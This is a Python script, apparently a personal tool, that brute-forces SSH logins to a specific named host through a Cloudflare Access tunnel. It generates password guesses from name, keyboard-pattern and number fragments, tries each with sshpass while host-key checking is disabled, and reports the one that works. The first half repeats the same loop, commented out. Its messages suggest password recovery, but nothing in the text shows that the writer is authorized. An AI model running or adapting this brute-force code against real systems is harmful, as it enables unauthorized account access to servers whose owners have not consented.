import itertools
import subprocess
from time import sleep
#
# usuario = 'araya'
# host = "ssh.arayaltda.cl"
#
# nombres = ["Araya", "araya"]
# patrones = ["zxc", "zxcv", "cxz", "vcxz"]
# numeros = ["123", "1234", "4321", "321"]
#
# combos = []
#
# for n, p, num in itertools.product(nombres, patrones, numeros):
#     # Nombre al principio
#     combos.append(f"{n},{p},{num}")
#     combos.append(f"{n},{num},{p}")
#     # Nombre al final
#     combos.append(f"{p},{num},{n}")
#     combos.append(f"{num},{p},{n}")
#
# # Eliminar duplicados
# combos = list(dict.fromkeys(combos))
#
# print(f"Probando {len(combos)} combinaciones vía Cloudflare Access...")
#
# for i, pwd in enumerate(combos, 1):
#     print(f"[{i}/{len(combos)}] Probando: {pwd} ... ", end="", flush=True)
#     sleep(10)
#
#     cmd = [
#         "sshpass", "-p", pwd,
#         "ssh",
#         "-o", "StrictHostKeyChecking=no",
#         "-o", "ConnectTimeout=5",
#         "-o", "ProxyCommand=cloudflared access ssh --hostname %h",
#         f"{usuario}@{host}",
#         "echo OK"
#     ]
#
#     res = subprocess.run(cmd, capture_output=True, text=True)
#
#     print(res.stderr)
#
#     # Evaluar si el comando se ejecutó con éxito (returncode == 0) y devolvió OK
#     if res.returncode == 0 and "OK" in res.stdout:
#         print("\n\n==========================================")
#         print(f" ¡ÉXITO! Tu contraseña correcta es: {pwd}")
#         print("==========================================\n")
#         break
#     else:
#         print("Incorrecta")



import subprocess

nombres = ["Araya", "araya","root"]
patrones = ["zxc", "zxcv", "cxz", "vcxz"]
numeros = ["123", "1234", "4321", "321"]

combos = []
combos = list(dict.fromkeys(combos))

for n, p, num in itertools.product(nombres, patrones, numeros):
    # Nombre al principio
    combos.append(f"{n},{p},{num}")
    combos.append(f"{n},{num},{p}")
    # Nombre al final
    combos.append(f"{p},{num},{n}")
    combos.append(f"{num},{p},{n}")

for i, pwd in enumerate(combos, 1):
    print(f"[{i}/{len(combos)}] Probando: {pwd} ... ", end="", flush=True)
    sleep(10)

    cmd = [
        "sshpass", "-p", pwd,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=5",
        "-o", "ProxyCommand=cloudflared access ssh --hostname %h",
        "-l",
        "araya",
        "ssh.arayaltda.cl",
        "echo OK"
    ]

    res = subprocess.run(cmd, capture_output=True, text=True)
    print(res.returncode,res.stderr)

    if res.returncode == 0 and "OK" in res.stdout:
        print("\n\n==========================================")
        print(f" ¡ÉXITO! Tu contraseña correcta es: {pwd}")
        print("==========================================\n")
        break
    else:
        print("Incorrecta")